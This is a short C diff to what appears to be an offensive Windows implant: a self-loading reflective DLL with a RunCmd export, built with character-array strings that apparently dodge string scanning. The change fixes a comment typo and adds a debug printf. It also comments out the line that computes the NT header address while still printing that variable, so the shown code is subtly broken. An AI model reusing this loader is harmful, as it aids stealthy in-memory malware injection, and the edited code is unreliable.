@@ -133,7 +133,7 @@ DLLEXPORT CHAR* WINAPI RunCmd(CHAR* cmd, PDWORD totalSize)
 /*
  * This function takes the responsibility of the Windows DLL loader and loads the DLL
  * that it belongs to into memory, performing needed operations such as resolving the
- * import table and performing base reallocations.
+ * import table and performing base relocations.
  *
  * Output:
  *      The entry point of the DLL (a.k.a. DllMain)
@@ -219,7 +219,13 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     }
 
     // NtHeader struct
-    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
+    //uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
+
+    #ifdef DEBUG
+    CHAR ntHeader_f[] = { '2', 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0};
+    // e_lfanew = offset to nt headers
+    ((PRINTF)api->printf)(ntHeader_f, uiHeaderValue);
+    #endif
 
     // get a handle to VirtualAlloc
     api->VirtualAlloc = (UINT64)(GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c));
